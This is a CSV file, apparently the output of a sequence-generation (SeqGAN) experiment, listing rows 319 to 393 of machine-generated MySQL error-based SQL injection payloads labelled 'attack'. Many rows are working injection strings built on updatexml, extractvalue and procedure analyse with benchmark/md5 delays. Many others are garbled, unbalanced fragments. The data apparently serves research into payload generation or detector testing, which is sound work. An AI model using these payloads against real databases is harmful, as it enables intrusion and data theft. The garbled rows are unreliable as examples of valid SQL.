attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,319
attack,"1%%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""b'  =  ''  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,320
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,321
attack,"1%,pv)    p""  =  ""ok",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,322
attack," 1 where extractvalue  (  9255,concat  (  (  0x5c,0x7171706a71,  (  (  =  (  benchmark  (   (  (  8375,1   )    AND AND FROM 1 else a  (  (  (  (  elt  (  case  =  6581  (  select   (  elt  (  elt0x4b774c75   end  (  (  el  (  1297  =  (  (  (  (  0x5c,  (  (  select   (  elt  (  e  (  0x5c,0x7171706a71,  (  select   (  (  e  (  elt  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,323
attack,"1%  procokcedddure analyse  (  8375  =  2446  utl  )  # d5  (  elt  (  0x5c,st  (  benchmark  (  (  benchmark  (  50000000x7171706a71,  (  (  benchmark  (  (  5000000(  extractvalue  (  select 0 0 USextractvalue  (  9627,md5  (  select   (  elt  (  8375  select   (  elt  e  (  0x5c,0x7171706a71,  (  select   (  5704  =  6804  (  (  =  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,324
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and """" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and """" like ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,325
attack,"1%j"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%"" like """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,326
attack,"1%""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,327
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,328
attack,"1%'  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,329
attack,"1%"" procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and """" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%""  =  ""'  =  'kprc   xdure anal  )  )  =  5603  (  5704   (  1724  (  8862,1   (  't  case when   (  (  (  elt  (  3393  =  (  (  3393,1   from dd5 duana  )  )  )   SELECT )    )    (    ) AND FROM d5  (  select 0 from anal  )  )  )   end  (  (  elt  (  6461  =  5433  ut  e  (  /  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,330
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,331
attack,"1 and extractvalue  (  (  (  (  (  (  (  =  (  (  (  7982(  =  (  1808,concat  (  (  (  (  0x2e,0x7171706a71,  (  select   (  elt  (  elt  (  5000000(  0x52515a50   (  5603  (  elt  (  0x2e,0x7171706a71,  (  =  (  3393,concat  (  (  (  0x2e,0x7171706a71,  (  select   (  elt  (  (  5433  )  1808  (  (  (  0x2e,0x7171706a71,  (  select   (  elt5464  =  4125  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,332
attack,"1%%""   )    AND proce anal  )  elta  )  )  e  )  (  case when   (  1354  (  0x4b774c75   (  7636  (  elt  (  1808  =  (  0x2e,  (  (  case  =  (  (  0x2e,0x7171706a71,  (  select   (  (  elt  (  e  (  3393  =  (  0x5c,  (  select   (  case 0 from from d5  (  elt  elt  (  e  (  0x2e,md5  (  (  1808  =",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,333
attack,"1%' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,334
attack,"1%' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and '%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,335
attack,"1%"" and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,336
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,337
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%"" like ""#",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,338
attack,"1%""   )    uys.anAT",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,339
attack,"1%'  =  'xpuxu'  =  'k'  =  'kbn      0x717a767a71,mfrom   (    (  el  (  select   (  elt  (  elt  (  3393  =  (  (  (  0x2e,  (  select   (  )  elt  (  3393  =  (  0x5c,0x7171706a71,  (  (  benchmark  (  (  (  5000000(  0x5c,  (  (  1808,concat  (  0x5c,  (  5000000,md5  (  (  0x5c,0x7171706a71,  (  9627,md5  (  (  2917,m,  (  5000000(  (  benchmark  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,340
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%""  =  ""obnce analalee  3681  (  (  (  (  0x2e,md5  (  (  (  0x5c,  (  (  (  5000000,md5  (  (  0x2e,0x7171706a71,  (  5000000,md5  (  0x5c,  (  (  (  0x2e,(  (  (  benchmark  (  (  benchmark  (  5000000,md5  (  0x5c,0x7171706a71,  (  benchmark  (  (  benchmark  (  5000000(  (  2917,1   )    (  extractvalue  (  (  2917,concat  (  (  (  (  select",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,341
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,342
attack,"1%"" and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,343
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""'  =  ''  =  'k'  =  'kphf",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,344
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,345
attack,"1%' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,346
attack,"1' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and 'UznAW"" procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and ""%nce aname  (  (  elt  (  elt  (  e  (  0x5c,md5  (  (  0x5c,0x7171706a71,  (  benchmark  (  benchmark  (  (  5000000,md5  (  (  3393,1  )  select   (  case when   (  5777  (  5000000,md5  (  3393  (  (  (  0x2e,md5  (  benchmark  (  (  =  (  benchmark  (  (  1297,  (  (  0x2e,  (  (  select   (  el  (  7982",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,347
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,348
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and 'o%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,349
attack,"1%""  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,350
attack,"AND proceduree    (  (  elt  (  e  (  3393  =  (  1808,1   from d anal  )  e  =d",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,351
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,352
attack,"1%"" or extractvalue  (  (  1808,concat  (  (  (  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  5777  )  1808  (  (  0x2e,0x7171706a71,  (  select   (  3393,md5  (  (  elt  (  1808  =  3393,  (  9627,concat  (  0x5c,0x7171706a71,  (  (  5000000,md5  (  1297,concat  (  (  select   (  3393,1   )    (  extractvalue  (  (  9627,concat  (  (  0x4b774c75   (  (  el  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,353
attack,1%z'  =  ',error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,354
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,355
attack,"1' or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and '~(1   )extractvalueextractvalue  (  (  (  0x5c,  (  (  (  5000000,md5  (  0x2e,0x7171706a71,  (  select   (  elt  (  case when   (  1812  (  (  9667  =  (  6369  =  (  3393,1 or extractvalue  (  (  1297,concat  (  (  (  1297  =  (  select   (  1808,  (  (  1297  =  (  (  (  5000000,md5  (  1808,md5  (  (  0x2e,md5  (  (  0x5c,  (  (  5000000",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,356
attack,"1%""   )    (  extractvalue  (  9627,concat  (  (  (  (  (  (  0x5c,0x7171706a71,  (  (  benchmark  (  benchmark  (  (  5000000(  (  0x2e,0x7171706a71,  (  (  (  (  select   (   from d 0 from dual  )   end  (  (  elt  elt  (  benchmark  (  2917,1,md5  (  2917  =  (  (  (  0x2e,0x7171706a71,  (  select   (  e  (  5433  (  e  (  benchmark  (  (  elt  (  0x2e",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,357
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,358
attack,"1%'  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  '%'  =  ')b'  =  ' bnalyse  (  (  (  elnt  (  1759  =  (  7982,md5  (  (  1 ast  )  elt  (  1049  =  (  0x5c,  (  select   (  (  elt  (  e  (  1808  =  (  1808,1   from d,(  (  9667  =  (  (  1808,  (  0x2e,0x7171706a71,  (  (  (  5000000(  (  7982  (  (  select   (  (  elt  2917  =  (  (  0x2e,",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,359
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,360
attack,"1%"" and updatexml  (  ((  1759  (  (  (  (  (  (  3393  (  0x2e,0x7171706a71,  (  benchmark  (  (  (  5000000(  (  (  1808  )  0x2e,0x7171706a71,  (    (  (  updatexml  (  (  (  (  =  (  (   (    (  2917,0x7171706a71  =  (  9627,concat  (  (  0x5c,  (  (  (  select   (  e  (  elt  (  (  elt  (  1297  =  (  3393,concat  (  (  (  3393  =  (  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,361
attack,"1%""   )    )     extractvalue  (  (  2917,concat  (  (  (  (  1297,concat  (  0x2e,0x7171706a71,  (  benchmark  (  (  (  benchmark  (  (  (  amd5  (  2501  =  (  (  1808  =  (  5423  (  select   (  el  (  (  7982  =  (  0x5c,0x7171706a71,  (  5000000(  (  0x2e,0x7171706a71,  (  (  5000000,md5  (  0x5c,0x7171706a71,  (  select   (  elt  (  elt  (  1297  =  3393,  (  5000000(",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,362
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,363
attack,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,364
attack,"1%%p bbnenameduame  (  (  elt  (  9490  =  8768  (  0x7171706a71,  (  (  select   (  elt  (  elt  (  select   (  elt  (  7982  =  (  (  1 as anal  )  )  0x5c,0x7171706a71,  (  9255,concat  (  (  select   (  5198  =  (  3393,  (  (  (  5000000,md(   SELECT du 0 'i'  (  select 0 from duane anal  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,365
attack,"1% where and updatexml  (  (  (  0x7171706a71(  (  8768  (  (  6528  )  (  (  (  (  1759(  (  (  (  (  (  (  (  (  7982  =  (  (  (  select   (  (  )  elt  (  1808  =  (  (  1808,1   )    FROM unal    (  (  (  1 a  )  )  select 0 from d d 0 0 from dual  )   end  (  (  elt  )  el  (  1297  =",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,366
attack,"1%'   )    (  U  extractvalue  (  (  (  9627,concat  (  3393,concat  (  0x2e,md5  (  7982  =  (  (  0x2e,md5  (  3393  (  (  3393,1   (  case 0 from d5  (  elt  elt  (  2917  =  (  1 as dual  )   end  (  (   (  (  case 0 0 from(  e  (  2518l  (  9627,concat  (  (  (  0x5c,0x7171706a71,  (  select   (  elt  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,367
attack,"1%""   )    )  extractvalue  (  5000000,md5  (  (  (  1808,1   (  )  case 0 from dual  )  )   SELECT d anend 0   (  (  ela  )  e  (  1049  (  0x5c,  (  select   (  case 0 from 0 from d dua  elt  elt  1297  =  7982  (  (  select   (  elt  (  case when   (  (  (  elt  (  7982  =  (  0x5c,0x7171706a71,  (  (  benchmark",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,368
attack," 1extractvalueconcat  (  (  7  (  (  (  5000000,m(    (  (  benchmark  (  (  (  5000000(  =  (  (  7982,1   )    AND 'i'  =  2162  )  select   (  case from 0 from dual  )   end  (  (  1049,md5  ut  (  e)analys  (  2917  =  (  1 from 0     (  (  case 0 updatexml  (  0x5c,0x7171706a71,  (  t   (  1354  (  (  0x5c,0x7171706a71,  (  (  select   (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,369
attack,"1%' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,370
attack,"1 or extractvalue  (  (  (  (  0x2e,md5  (  0x2e,0x7171706a71,  (  (  5000000(  (  0x2e,  (  (  benchmark  (  (  (  (  benchmark  (  benchmark  (  5000000(  0x2e,0x7171706a71,  (  (  benchmark  (  =  2917,  (  (  select   (  7982,1   )    (  extractvalue  (  9627,  (  (  (  updatexml  (  (  (  (  (  benchmark  (  (  (   (  Ut3863   (  5322  (  (  0x5c,0x7171706a71,  (  select   (  elq(",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,371
attack,"1%pkp'i'endInc FROMnlyloogenalyte  (  1808  =  =  3393,  (  select   (  elta  elt  (  elt  (  0x2e,0x7171706a71,  (  (  5000000(  (  0x5c,  (  benchmark  (  (  select   (  elt  (  eltado  t  (  benchmark  (  benchmark  (  (  benchmark  (  (  1297,1   )    (  9338  extractvalue  (  9627,md5  (  9627,md5  (  (  0x2e,0x7171706a71,  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,372
attack,"1%' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and '%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,373
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,374
attack,"1'  )   from dual  u de  elt  e  (  1297  =  3393,  (  5000000(  1759(  (  0x5c,  (  select   (  elt  (  3393  =  8868  (   (  (  4415  =  (  (  1297  =  (  (  0x5c,  =  (  (  5000000,md5  (  3393,md5  (  0x2e,(  (  select   (  elt  )  0x5c,0x7171706a71,  (  (  9627,concat  (  (  (  (  3393  (  select   (  elt  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,375
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,376
attack,"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,377
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and "" p'i'l",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,378
attack,"1%"" procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,379
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,380
attack,"1%""   )    )     extractvalue  (  (  1808,concat  (  (  (  (  (  (  (  (  select   (  e(  e  case alt   case  )   (  (  elt  elt  (  benchmark  (  (  97880x7171706a71,0x7171706a71,  (  (  5000000,md5  (  0x2e,md5  (  (  select   (  1808,0x717a767a71   (  (  elt  (   e  (  5433  (  (  3393,1   )    )    (  extractvalue  (  (  9627,concat  (  0x2e,0x7171706a71,  (  (",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,381
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and 'ekmndgumnancenal  (  0x4b774c75   (  )  (  elt  (  0x2e,0x7171706a71,  (  select   (  el  (  0x5c,  (  5000000(  3393,1   (  extractvalue  (  (  benchmark  (  (  3393,1   )    'i'  (  select   (  extractvalue  (  (  (  1297,concat  (  (  0x5c,A  (  select   (ananal  =  3393,md5  (  0x5c,  (  select   (  elt  (  e  (  1808  =  (  1802",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,382
attack,"1%""   proce anal  el  )  1297  =  (  (  0x5c,  (  (  benchmark  (  (  1759(  3393  (  (  0x5c,0x7171706a71,  (  5000000,md5  (  =  utl  )  =  (  1297,concat  (  (  0x5c,0x7171706a71,  (  select   (  5000000(  (  elt  (  0x5c,0x7171706a71,  (  (  benchmark  (  (  5000000(  (  1808,concat  (  (  (  0x2e,m5  (  (  0x5c,0x7171706a71,  (  selectt  (  (  ",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,383
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,384
attack,"1%"" or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and ""% pphpfonselect--",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,385
attack,"1%,pC%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,386
attack,"1%'  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  '%'  =  '' like 'pk'  =  'cxpk'  =  'kndbro'  =  'eananalyse    (  case 0 from dual  )  el  )  e  )   (  6134  (  (  elt  (  e  (  select   (  (  elt  e  (  (  1808  =  (  0x5c,  (  benchmark  (  (  5000000(  0x2e,0x717a767a71   (  (  el  (  0x4b774c75   )    (  4066  =  1  (  (  ut  case when   (  (  (  1808  =  (  3393",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,387
attack,"'  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  ' bole anal  )    )    (sa    (  (  0x2e,0x7171706a71,  (  select   (  a  )  (  (  elt  (  0x2e,0x7171706a71,  (  select   (   (  (  case 0 a  (  elt  (  elt  (  7982  =  1   )    (  extractvalue  (  (  5000000(  3393  =  (  (  0x2e,  (  benchmark  (  5000000(  (  0x2e,0x7171706a71,  (  select   (  (  elt  (   SELECT d d5   (  2914  (  3393,",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,388
attack,"1%""  )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and   (  ""%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,389
attack,"1%' procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and '%'  =  '",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,390
attack,"1%%' or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ''  =  'y",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,391
attack,"1%'   )    )    AND wxT  (  1  extractvalue  (  (  (  (  (  5000000(  3393,concat  (  (  (  (  (  0x2e,0x7171706a71,  (  3393  (  (  (  1049  =  (  (  (  5000000,1   (  5198  (  (  0x5c,0x7171706a71,  (  select   (  (  case when   (  3863  (  (  2917,0x717a767a71   (  (  elt  e  0x4b774c75  )  # duse   (  3576  =  (  (  1808  =  (  3393,  (  select   (  e",error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,392
attack,"1%"" or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and ""%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__B__100__V8__sql_aware__len160__gpre160__reward_on__seed88,393
